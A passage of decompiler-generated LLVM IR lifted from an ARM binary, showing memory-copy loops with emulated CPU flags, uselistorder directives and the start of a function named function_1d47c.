  %v4_1d3d0 = mul i32 %v2_1d3cc, 65536
  %v5_1d3d0 = or i32 %v4_1d3d0, %v3_1d3c8
  store i32 %v5_1d3d0, i32* @ip, align 4
  %v2_1d3d4 = inttoptr i32 %v1_1d3d4 to i32*
  store i32 %v5_1d3d0, i32* %v2_1d3d4, align 4
  %v3_1d3d4 = load i32, i32* %r0.global-to-local, align 4
  %v4_1d3d4 = add i32 %v3_1d3d4, 4
  store i32 %v4_1d3d4, i32* %r0.global-to-local, align 4
  %v0_1d3d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_1d3d8 = add i32 %v0_1d3d8, -4
  store i32 %v1_1d3d8, i32* %r2.global-to-local, align 4
  %v3_1d3d8 = sub i32 3, %v0_1d3d8
  %v4_1d3d8 = and i32 %v3_1d3d8, %v0_1d3d8
  %v5_1d3d8 = icmp slt i32 %v4_1d3d8, 0
  %v6_1d3d8 = icmp slt i32 %v1_1d3d8, 0
  %v2_1d3dc = xor i1 %v6_1d3d8, %v5_1d3d8
  br i1 %v2_1d3dc, label %dec_label_pc_1d3e0.loopexit, label %dec_label_pc_1d3c8

dec_label_pc_1d3e0.loopexit:                      ; preds = %dec_label_pc_1d3c8
  %v7_1d3d8 = icmp eq i32 %v0_1d3d8, 4
  store i1 %v5_1d3d8, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_1d3d8, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_1d3d8, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1d3e0

dec_label_pc_1d3e0:                               ; preds = %dec_label_pc_1d3e0.loopexit, %dec_label_pc_1d3bc
  %v0_1d29c4 = phi i32 [ %v1_1d3d8, %dec_label_pc_1d3e0.loopexit ], [ %v1_1d3c0, %dec_label_pc_1d3bc ]
  %v0_1d3e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_1d3e0 = add i32 %v0_1d3e0, -2
  store i32 %v1_1d3e0, i32* @r1, align 4
  br label %bb84

dec_label_pc_1d3e8:                               ; preds = %dec_label_pc_1d2fc
  br i1 %v2_1d380, label %dec_label_pc_1d434, label %dec_label_pc_1d3f0

dec_label_pc_1d3f0:                               ; preds = %dec_label_pc_1d3e8
  store i32 %v1_1d37c, i32* %r2.global-to-local, align 4
  %v3_1d3f4 = load i32, i32* @r4, align 4
  store i32 %v3_1d3f4, i32* %stack_var_-16, align 4
  %v6_1d3f4 = load i32, i32* @r5, align 4
  store i32 %v6_1d3f4, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1d3f8

dec_label_pc_1d3f8:                               ; preds = %dec_label_pc_1d3f8.dec_label_pc_1d3f8_crit_edge, %dec_label_pc_1d3f0
  %v0_1d41c = phi i32 [ %v12_1d41c, %dec_label_pc_1d3f8.dec_label_pc_1d3f8_crit_edge ], [ %v0_1d41c20, %dec_label_pc_1d3f0 ]
  %v0_1d3fc = phi i32 [ %v0_1d3fc.pre, %dec_label_pc_1d3f8.dec_label_pc_1d3f8_crit_edge ], [ %v4_1d300, %dec_label_pc_1d3f0 ]
  %v0_1d3f8 = phi i32 [ %v0_1d3f8.pre, %dec_label_pc_1d3f8.dec_label_pc_1d3f8_crit_edge ], [ %v2_1d300, %dec_label_pc_1d3f0 ]
  %v3_1d3f8 = udiv i32 %v0_1d3f8, 16777216
  %v1_1d3fc = inttoptr i32 %v0_1d3fc to i32*
  %v2_1d3fc = load i32, i32* %v1_1d3fc, align 4
  store i32 %v2_1d3fc, i32* %r4.global-to-local, align 4
  %v3_1d3fc = add i32 %v0_1d3fc, 4
  %v4_1d3fc = inttoptr i32 %v3_1d3fc to i32*
  %v5_1d3fc = load i32, i32* %v4_1d3fc, align 4
  store i32 %v5_1d3fc, i32* %r5.global-to-local, align 4
  %v6_1d3fc = add i32 %v0_1d3fc, 8
  %v7_1d3fc = inttoptr i32 %v6_1d3fc to i32*
  %v8_1d3fc = load i32, i32* %v7_1d3fc, align 4
  store i32 %v8_1d3fc, i32* %ip.global-to-local, align 4
  %v9_1d3fc = add i32 %v0_1d3fc, 12
  %v10_1d3fc = inttoptr i32 %v9_1d3fc to i32*
  %v11_1d3fc = load i32, i32* %v10_1d3fc, align 4
  store i32 %v11_1d3fc, i32* %lr.global-to-local, align 4
  %v12_1d3fc = add i32 %v0_1d3fc, 16
  store i32 %v12_1d3fc, i32* %r1.global-to-local, align 4
  %v4_1d400 = mul i32 %v2_1d3fc, 256
  %v5_1d400 = or i32 %v4_1d400, %v3_1d3f8
  store i32 %v5_1d400, i32* @r3, align 4
  %v3_1d404 = udiv i32 %v2_1d3fc, 16777216
  %v4_1d408 = mul i32 %v5_1d3fc, 256
  %v5_1d408 = or i32 %v4_1d408, %v3_1d404
  store i32 %v5_1d408, i32* %r4.global-to-local, align 4
  %v3_1d40c = udiv i32 %v5_1d3fc, 16777216
  %v4_1d410 = mul i32 %v8_1d3fc, 256
  %v5_1d410 = or i32 %v4_1d410, %v3_1d40c
  store i32 %v5_1d410, i32* %r5.global-to-local, align 4
  %v3_1d414 = udiv i32 %v8_1d3fc, 16777216
  %v4_1d418 = mul i32 %v11_1d3fc, 256
  %v5_1d418 = or i32 %v4_1d418, %v3_1d414
  store i32 %v5_1d418, i32* @ip, align 4
  %v1_1d41c = inttoptr i32 %v0_1d41c to i32*
  store i32 %v5_1d400, i32* %v1_1d41c, align 4
  %v3_1d41c = add i32 %v0_1d41c, 4
  %v4_1d41c = inttoptr i32 %v3_1d41c to i32*
  %v5_1d41c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1d41c, i32* %v4_1d41c, align 4
  %v6_1d41c = add i32 %v0_1d41c, 8
  %v7_1d41c = inttoptr i32 %v6_1d41c to i32*
  %v8_1d41c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_1d41c, i32* %v7_1d41c, align 4
  %v9_1d41c = add i32 %v0_1d41c, 12
  %v10_1d41c = inttoptr i32 %v9_1d41c to i32*
  %v11_1d41c = load i32, i32* @ip, align 4
  store i32 %v11_1d41c, i32* %v10_1d41c, align 4
  %v12_1d41c = add i32 %v0_1d41c, 16
  store i32 %v12_1d41c, i32* %r0.global-to-local, align 4
  %v0_1d420 = load i32, i32* %r2.global-to-local, align 4
  %v1_1d420 = add i32 %v0_1d420, -16
  store i32 %v1_1d420, i32* %r2.global-to-local, align 4
  %v3_1d420 = sub i32 15, %v0_1d420
  %v4_1d420 = and i32 %v3_1d420, %v0_1d420
  %v5_1d420 = icmp slt i32 %v4_1d420, 0
  %v6_1d420 = icmp slt i32 %v1_1d420, 0
  %v2_1d424 = xor i1 %v6_1d420, %v5_1d420
  br i1 %v2_1d424, label %dec_label_pc_1d428, label %dec_label_pc_1d3f8.dec_label_pc_1d3f8_crit_edge

dec_label_pc_1d3f8.dec_label_pc_1d3f8_crit_edge:  ; preds = %dec_label_pc_1d3f8
  %v0_1d3f8.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_1d3fc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1d3f8

dec_label_pc_1d428:                               ; preds = %dec_label_pc_1d3f8
  %v2_1d428 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1d428, i32* @r4, align 4
  %v5_1d428 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_1d428, i32* @r5, align 4
  %v1_1d42c = add i32 %v0_1d420, -4
  store i32 %v1_1d42c, i32* %r2.global-to-local, align 4
  %v3_1d42c = add i32 %v0_1d420, 2147483632
  %v4_1d42c = and i32 %v1_1d42c, %v3_1d42c
  %v5_1d42c = icmp slt i32 %v4_1d42c, 0
  store i1 %v5_1d42c, i1* %cpsr_v.global-to-local, align 1
  %v6_1d42c = icmp slt i32 %v1_1d42c, 0
  store i1 %v6_1d42c, i1* %cpsr_n.global-to-local, align 1
  %v7_1d42c = icmp eq i32 %v1_1d42c, 0
  store i1 %v7_1d42c, i1* %cpsr_z.global-to-local, align 1
  %v2_1d430 = xor i1 %v6_1d42c, %v5_1d42c
  br i1 %v2_1d430, label %dec_label_pc_1d44c, label %dec_label_pc_1d434

dec_label_pc_1d434:                               ; preds = %dec_label_pc_1d428, %dec_label_pc_1d3e8, %dec_label_pc_1d434
  %v1_1d440 = phi i32 [ %v4_1d440, %dec_label_pc_1d434 ], [ %v12_1d41c, %dec_label_pc_1d428 ], [ %v0_1d41c20, %dec_label_pc_1d3e8 ]
  %v0_1d434 = load i32, i32* %lr.global-to-local, align 4
  %v3_1d434 = udiv i32 %v0_1d434, 16777216
  store i32 %v3_1d434, i32* %ip.global-to-local, align 4
  %v0_1d438 = load i32, i32* %r1.global-to-local, align 4
  %v1_1d438 = inttoptr i32 %v0_1d438 to i32*
  %v2_1d438 = load i32, i32* %v1_1d438, align 4
  store i32 %v2_1d438, i32* %lr.global-to-local, align 4
  %v4_1d438 = add i32 %v0_1d438, 4
  store i32 %v4_1d438, i32* %r1.global-to-local, align 4
  %v4_1d43c = mul i32 %v2_1d438, 256
  %v5_1d43c = or i32 %v4_1d43c, %v3_1d434
  store i32 %v5_1d43c, i32* @ip, align 4
  %v2_1d440 = inttoptr i32 %v1_1d440 to i32*
  store i32 %v5_1d43c, i32* %v2_1d440, align 4
  %v3_1d440 = load i32, i32* %r0.global-to-local, align 4
  %v4_1d440 = add i32 %v3_1d440, 4
  store i32 %v4_1d440, i32* %r0.global-to-local, align 4
  %v0_1d444 = load i32, i32* %r2.global-to-local, align 4
  %v1_1d444 = add i32 %v0_1d444, -4
  store i32 %v1_1d444, i32* %r2.global-to-local, align 4
  %v3_1d444 = sub i32 3, %v0_1d444
  %v4_1d444 = and i32 %v3_1d444, %v0_1d444
  %v5_1d444 = icmp slt i32 %v4_1d444, 0
  %v6_1d444 = icmp slt i32 %v1_1d444, 0
  %v2_1d448 = xor i1 %v6_1d444, %v5_1d444
  br i1 %v2_1d448, label %dec_label_pc_1d44c.loopexit, label %dec_label_pc_1d434

dec_label_pc_1d44c.loopexit:                      ; preds = %dec_label_pc_1d434
  %v7_1d444 = icmp eq i32 %v0_1d444, 4
  store i1 %v5_1d444, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_1d444, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_1d444, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1d44c

dec_label_pc_1d44c:                               ; preds = %dec_label_pc_1d44c.loopexit, %dec_label_pc_1d428
  %v0_1d29c5 = phi i32 [ %v1_1d444, %dec_label_pc_1d44c.loopexit ], [ %v1_1d42c, %dec_label_pc_1d428 ]
  %v0_1d44c = load i32, i32* %r1.global-to-local, align 4
  %v1_1d44c = add i32 %v0_1d44c, -1
  store i32 %v1_1d44c, i32* @r1, align 4
  br label %bb84

dec_label_pc_1d454:                               ; preds = %entry
  %v1_1d454 = load i32, i32* @r2, align 4
  %v2_1d454 = add i32 %v1_1d454, %v0_1d200
  store i32 %v2_1d454, i32* @r1, align 4
  %v2_1d458 = add i32 %v1_1d454, %v1_1d200
  store i32 %v2_1d458, i32* %r0.global-to-local, align 4
  %v1_1d45c = add i32 %v1_1d454, -4
  store i32 %v1_1d45c, i32* %r2.global-to-local, align 4
  %v3_1d45c = sub i32 3, %v1_1d454
  %v4_1d45c = and i32 %v3_1d45c, %v1_1d454
  %v5_1d45c = icmp slt i32 %v4_1d45c, 0
  store i1 %v5_1d45c, i1* %cpsr_v.global-to-local, align 1
  %v6_1d45c = icmp slt i32 %v1_1d45c, 0
  store i1 %v6_1d45c, i1* %cpsr_n.global-to-local, align 1
  %v7_1d45c = icmp eq i32 %v1_1d454, 4
  store i1 %v7_1d45c, i1* %cpsr_z.global-to-local, align 1
  %v2_1d460 = xor i1 %v6_1d45c, %v5_1d45c
  call void @__pseudo_cond_branch(i1 %v2_1d460, i32 ptrtoint (i32* @global_var_1d4e4.1743 to i32))
  %v1_1d464 = urem i32 %v2_1d458, 4
  store i32 %v1_1d464, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1d464 = icmp eq i32 %v1_1d464, 0
  store i1 %v2_1d464, i1* %cpsr_z.global-to-local, align 1
  %v1_1d468 = xor i1 %v2_1d464, true
  call void @__pseudo_cond_branch(i1 %v1_1d468, i32 ptrtoint (i32* @global_var_1d50c.1744 to i32))
  %v0_1d46c = load i32, i32* @r1, align 4
  %v1_1d46c = urem i32 %v0_1d46c, 4
  store i32 %v1_1d46c, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1d46c = icmp eq i32 %v1_1d46c, 0
  store i1 %v2_1d46c, i1* %cpsr_z.global-to-local, align 1
  %v1_1d470 = xor i1 %v2_1d46c, true
  call void @__pseudo_cond_branch(i1 %v1_1d470, i32 ptrtoint (i32* @global_var_1d538.1745 to i32))
  %v0_1d474 = load i32, i32* %r2.global-to-local, align 4
  %v1_1d474 = add i32 %v0_1d474, -8
  store i32 %v1_1d474, i32* @r2, align 4
  %v3_1d474 = sub i32 7, %v0_1d474
  %v4_1d474 = and i32 %v3_1d474, %v0_1d474
  %v5_1d474 = icmp slt i32 %v4_1d474, 0
  store i1 %v5_1d474, i1* %cpsr_v.global-to-local, align 1
  %v6_1d474 = icmp slt i32 %v1_1d474, 0
  store i1 %v6_1d474, i1* %cpsr_n.global-to-local, align 1
  %v7_1d474 = icmp eq i32 %v0_1d474, 8
  store i1 %v7_1d474, i1* %cpsr_z.global-to-local, align 1
  %v2_1d478 = xor i1 %v6_1d474, %v5_1d474
  call void @__pseudo_cond_branch(i1 %v2_1d478, i32 ptrtoint (i32* @global_var_1d4c4.1746 to i32))
  ret i32 %v2_1d458

; uselistorder directives
  uselistorder i32 %v1_1d474, { 1, 0 }
  uselistorder i32 %v0_1d474, { 3, 0, 1, 2 }
  uselistorder i32 %v1_1d46c, { 1, 0 }
  uselistorder i32 %v1_1d464, { 1, 0 }
  uselistorder i32 %v1_1d45c, { 1, 0 }
  uselistorder i32 %v2_1d458, { 1, 0, 2 }
  uselistorder i32 %v1_1d454, { 3, 0, 5, 4, 1, 2 }
  uselistorder i32 %v1_1d444, { 0, 2, 1 }
  uselistorder i32 %v4_1d440, { 1, 0 }
  uselistorder i32 %v3_1d434, { 1, 0 }
  uselistorder i32 %v1_1d42c, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_1d420, { 1, 0 }
  uselistorder i32 %v12_1d41c, { 0, 2, 1 }
  uselistorder i32 %v8_1d3fc, { 1, 0, 2 }
  uselistorder i32 %v5_1d3fc, { 1, 0, 2 }
  uselistorder i32 %v2_1d3fc, { 1, 0, 2 }
  uselistorder i32 %v0_1d3fc, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1d41c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1d3d8, { 0, 2, 1 }
  uselistorder i32 %v4_1d3d4, { 1, 0 }
  uselistorder i32 %v3_1d3c8, { 1, 0 }
  uselistorder i32 %v1_1d3c0, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_1d3b4, { 1, 0 }
  uselistorder i32 %v12_1d3b0, { 0, 2, 1 }
  uselistorder i32 %v8_1d390, { 1, 0, 2 }
  uselistorder i32 %v5_1d390, { 1, 0, 2 }
  uselistorder i32 %v2_1d390, { 1, 0, 2 }
  uselistorder i32 %v0_1d390, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1d3b0, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1d36c, { 0, 2, 1 }
  uselistorder i32 %v4_1d368, { 1, 0 }
  uselistorder i32 %v3_1d35c, { 1, 0 }
  uselistorder i32 %v1_1d354, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_1d348, { 1, 0 }
  uselistorder i32 %v12_1d344, { 0, 2, 1 }
  uselistorder i32 %v8_1d324, { 1, 0, 2 }
  uselistorder i32 %v5_1d324, { 1, 0, 2 }
  uselistorder i32 %v2_1d324, { 1, 0, 2 }
  uselistorder i32 %v0_1d324, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1d344, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v2_1d380, { 0, 2, 1 }
  uselistorder i32 %v1_1d37c, { 2, 0, 1, 3 }
  uselistorder i32 %v4_1d300, { 2, 0, 1, 3 }
  uselistorder i32 %v2_1d300, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1d384, { 1, 0, 3, 2 }
  uselistorder i32 %v0_1d41c20, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32 %v1_1d2f4, { 1, 0 }
  uselistorder i32 %v0_1d2f4, { 3, 1, 0, 2 }
  uselistorder i32 %v2_1d2ec, { 2, 4, 0, 5, 1, 3 }
  uselistorder i32 %v1_1d2ec, { 1, 0, 2 }
  uselistorder i32 %v0_1d2ec, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1d41c21, { 1, 0 }
  uselistorder i32 %v1_1d2cc, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_1d2d4, { 1, 0 }
  uselistorder i32 %v0_1d2a8, { 3, 0, 1, 2 }
  uselistorder i32 %v1_1d29c, { 1, 2, 0, 3 }
  uselistorder i32 %v5_1d288, { 1, 0, 2 }
  uselistorder i32 %v1_1d284, { 1, 0 }
  uselistorder i32 %v1_1d27c, { 2, 0, 1, 4, 5, 3, 6 }
  uselistorder i32 %v0_1d27c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_1d274, { 0, 2, 1 }
  uselistorder i32 %v3_1d274, { 3, 0, 1, 2 }
  uselistorder i1 %v0_1d274, { 1, 0 }
  uselistorder i1 %v1_1d274, { 1, 0 }
  uselistorder i32 %v3_1d270, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_1d268, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_1d254, { 1, 2, 0 }
  uselistorder i32 %v1_1d24c, { 0, 2, 1 }
  uselistorder i32 %v12_1d248, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1d23c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1d240, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v1_1d230, { 0, 2, 1 }
  uselistorder i32 %v1_1d228, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_1d228, { 1, 2, 3, 0, 5, 4 }
  uselistorder i32 %v1_1d220, { 1, 0 }
  uselistorder i32 %v1_1d218, { 2, 1, 0 }
  uselistorder i32 %v2_1d210, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v0_1d210, { 1, 4, 0, 2, 3 }
  uselistorder i32 %v8_1d20c, { 1, 0 }
  uselistorder i32 %v2_1d200, { 1, 0 }
  uselistorder i32 %v1_1d200, { 1, 4, 5, 3, 0, 6, 8, 2, 7, 9 }
  uselistorder i32 %v0_1d200, { 1, 6, 7, 5, 4, 0, 8, 10, 2, 3, 9, 11 }
  uselistorder i8** %stack_var_-8, { 2, 1, 0 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 34, 3, 4, 5, 6, 7, 35, 8, 9, 10, 11, 12, 36, 13, 14, 15, 16, 17, 37, 18, 19, 20, 22, 21, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 38 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 12, 1, 3, 6, 4, 13, 5, 7, 10, 8, 14, 9, 11, 15, 16, 19, 17, 20, 18, 21, 22, 23, 24 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 11, 4, 5, 12, 6, 7, 13, 8, 9, 14, 10, 15, 16, 18, 17, 19, 20, 22, 21, 23, 24, 30, 31, 25, 26, 27, 32, 28, 29, 33, 34, 0, 1 }
  uselistorder i32* %lr.global-to-local, { 0, 9, 1, 2, 3, 10, 4, 5, 6, 11, 7, 8, 12, 13, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i1* %cpsr_z.global-to-local, { 3, 4, 5, 6, 1, 7, 2, 8, 0, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28 }
  uselistorder i1* %cpsr_v.global-to-local, { 3, 4, 1, 5, 2, 6, 0, 8, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i1* %cpsr_n.global-to-local, { 3, 4, 5, 6, 1, 7, 2, 8, 0, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30 }
  uselistorder i32 2147483632, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1d434, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1d3c8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1d35c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1d2fc, { 1, 0 }
  uselistorder label %.thread72, { 1, 0 }
  uselistorder label %.thread71, { 1, 0 }
  uselistorder label %dec_label_pc_1d2cc, { 1, 0 }
  uselistorder label %.thread70, { 1, 0 }
  uselistorder label %.thread69, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %bb84, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %.thread59, { 1, 0 }
  uselistorder label %dec_label_pc_1d268, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %dec_label_pc_1d228, { 1, 0 }
}

define i32 @function_1d47c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_1d47c:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1d47c = load i32, i32* @r4, align 4
  store i32 %v3_1d47c, i32* %stack_var_-8, align 4
  %v2_1d480 = add i32 %arg3, -20
  store i32 %v2_1d480, i32* %r2.global-to-local, align 4
  %v5_1d484 = icmp slt i32 %arg3, 20
  br i1 %v5_1d484, label %dec_label_pc_1d4a0, label %dec_label_pc_1d488.preheader

dec_label_pc_1d488.preheader:                     ; preds = %dec_label_pc_1d47c
  %v0_1d48c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1d488

dec_label_pc_1d488:                               ; preds = %dec_label_pc_1d488.preheader, %dec_label_pc_1d488
  %v0_1d48c = phi i32 [ %v0_1d48c.pre, %dec_label_pc_1d488.preheader ], [ %v1_1d494, %dec_label_pc_1d488 ]
  %v0_1d488 = load i32, i32* %r1.global-to-local, align 4
  %v1_1d488 = add i32 %v0_1d488, -4
  %v2_1d488 = inttoptr i32 %v1_1d488 to i32*
  %v3_1d488 = load i32, i32* %v2_1d488, align 4
  %v4_1d488 = add i32 %v0_1d488, -8
  %v5_1d488 = inttoptr i32 %v4_1d488 to i32*
  %v6_1d488 = load i32, i32* %v5_1d488, align 4
  store i32 %v6_1d488, i32* %r4.global-to-local, align 4
  %v7_1d488 = add i32 %v0_1d488, -12
  %v8_1d488 = inttoptr i32 %v7_1d488 to i32*
  %v9_1d488 = load i32, i32* %v8_1d488, align 4
  store i32 %v9_1d488, i32* %ip.global-to-local, align 4
  %v10_1d488 = add i32 %v0_1d488, -16
  %v11_1d488 = inttoptr i32 %v10_1d488 to i32*
  %v12_1d488 = load i32, i32* %v11_1d488, align 4
  store i32 %v12_1d488, i32* %lr.global-to-local, align 4
  store i32 %v10_1d488, i32* %r1.global-to-local, align 4
  %v1_1d48c = add i32 %v0_1d48c, -16
  %v2_1d48c = inttoptr i32 %v1_1d48c to i32*
  store i32 %v3_1d488, i32* %v2_1d48c, align 4
  %v4_1d48c = add i32 %v0_1d48c, -12
  %v5_1d48c = inttoptr i32 %v4_1d48c to i32*
  %v6_1d48c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_1d48c, i32* %v5_1d48c, align 4
  %v7_1d48c = add i32 %v0_1d48c, -8
  %v8_1d48c = inttoptr i32 %v7_1d48c to i32*
  %v9_1d48c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_1d48c, i32* %v8_1d48c, align 4
  %v10_1d48c = add i32 %v0_1d48c, -4
  %v11_1d48c = inttoptr i32 %v10_1d48c to i32*
  %v12_1d48c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1d48c, i32* %v11_1d48c, align 4
  store i32 %v1_1d48c, i32* %r0.global-to-local, align 4
  %v0_1d490 = load i32, i32* %r1.global-to-local, align 4
  %v1_1d490 = add i32 %v0_1d490, -4
  %v2_1d490 = inttoptr i32 %v1_1d490 to i32*
  %v3_1d490 = load i32, i32* %v2_1d490, align 4
  %v4_1d490 = add i32 %v0_1d490, -8
  %v5_1d490 = inttoptr i32 %v4_1d490 to i32*
  %v6_1d490 = load i32, i32* %v5_1d490, align 4
  store i32 %v6_1d490, i32* %r4.global-to-local, align 4
  %v7_1d490 = add i32 %v0_1d490, -12
  %v8_1d490 = inttoptr i32 %v7_1d490 to i32*
  %v9_1d490 = load i32, i32* %v8_1d490, align 4
  store i32 %v9_1d490, i32* %ip.global-to-local, align 4
  %v10_1d490 = add i32 %v0_1d490, -16
  %v11_1d490 = inttoptr i32 %v10_1d490 to i32*
  %v12_1d490 = load i32, i32* %v11_1d490, align 4
  store i32 %v12_1d490, i32* %lr.global-to-local, align 4
  store i32 %v10_1d490, i32* %r1.global-to-local, align 4
  %v1_1d494 = add i32 %v0_1d48c, -32
  %v2_1d494 = inttoptr i32 %v1_1d494 to i32*
  store i32 %v3_1d490, i32* %v2_1d494, align 4
  %v4_1d494 = add i32 %v0_1d48c, -28
  %v5_1d494 = inttoptr i32 %v4_1d494 to i32*
  %v6_1d494 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_1d494, i32* %v5_1d494, align 4
  %v7_1d494 = add i32 %v0_1d48c, -24
  %v8_1d494 = inttoptr i32 %v7_1d494 to i32*
  %v9_1d494 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_1d494, i32* %v8_1d494, align 4
  %v10_1d494 = add i32 %v0_1d48c, -20
  %v11_1d494 = inttoptr i32 %v10_1d494 to i32*
  %v12_1d494 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1d494, i32* %v11_1d494, align 4
  store i32 %v1_1d494, i32* %r0.global-to-local, align 4
  %v0_1d498 = load i32, i32* %r2.global-to-local, align 4
  %v2_1d498 = add i32 %v0_1d498, -32
  store i32 %v2_1d498, i32* %r2.global-to-local, align 4
  %v6_1d49c = icmp slt i32 %v0_1d498, 32
  br i1 %v6_1d49c, label %dec_label_pc_1d4a0.loopexit, label %dec_label_pc_1d488

dec_label_pc_1d4a0.loopexit:                      ; preds = %dec_label_pc_1d488
  br label %dec_label_pc_1d4a0

dec_label_pc_1d4a0:                               ; preds = %dec_label_pc_1d4a0.loopexit, %dec_label_pc_1d47c
  %v0_1d4b0.pr = phi i32 [ %v2_1d498, %dec_label_pc_1d4a0.loopexit ], [ %v2_1d480, %dec_label_pc_1d47c ]
  %v5_1d4a4 = icmp slt i32 %v0_1d4b0.pr, -16
  br i1 %v5_1d4a4, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_1d4a0
  %v6_1d4a4 = load i32, i32* %r1.global-to-local, align 4
  %v7_1d4a4 = add i32 %v6_1d4a4, -4
  %v8_1d4a4 = inttoptr i32 %v7_1d4a4 to i32*
  %v9_1d4a4 = load i32, i32* %v8_1d4a4, align 4
  %v10_1d4a4 = add i32 %v6_1d4a4, -8
  %v11_1d4a4 = inttoptr i32 %v10_1d4a4 to i32*
  %v12_1d4a4 = load i32, i32* %v11_1d4a4, align 4
  store i32 %v12_1d4a4, i32* %r4.global-to-local, align 4
  %v13_1d4a4 = add i32 %v6_1d4a4, -12
  %v14_1d4a4 = inttoptr i32 %v13_1d4a4 to i32*
  %v15_1d4a4 = load i32, i32* %v14_1d4a4, align 4
  store i32 %v15_1d4a4, i32* %ip.global-to-local, align 4
  %v16_1d4a4 = add i32 %v6_1d4a4, -16
  %v17_1d4a4 = inttoptr i32 %v16_1d4a4 to i32*
  %v18_1d4a4 = load i32, i32* %v17_1d4a4, align 4
  store i32 %v18_1d4a4, i32* %lr.global-to-local, align 4
  store i32 %v16_1d4a4, i32* %r1.global-to-local, align 4
  %v6_1d4a8 = load i32, i32* %r0.global-to-local, align 4
  %v7_1d4a8 = add i32 %v6_1d4a8, -16
  %v8_1d4a8 = inttoptr i32 %v7_1d4a8 to i32*
  store i32 %v9_1d4a4, i32* %v8_1d4a8, align 4
  %v10_1d4a8 = add i32 %v6_1d4a8, -12
  %v11_1d4a8 = inttoptr i32 %v10_1d4a8 to i32*
  %v12_1d4a8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_1d4a8, i32* %v11_1d4a8, align 4
  %v13_1d4a8 = add i32 %v6_1d4a8, -8
  %v14_1d4a8 = inttoptr i32 %v13_1d4a8 to i32*
  %v15_1d4a8 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v15_1d4a8, i32* %v14_1d4a8, align 4
  %v16_1d4a8 = add i32 %v6_1d4a8, -4
  %v17_1d4a8 = inttoptr i32 %v16_1d4a8 to i32*
  %v18_1d4a8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_1d4a8, i32* %v17_1d4a8, align 4
  store i32 %v7_1d4a8, i32* %r0.global-to-local, align 4
  %v6_1d4ac = load i32, i32* %r2.global-to-local, align 4
  %v7_1d4ac = add i32 %v6_1d4ac, -16
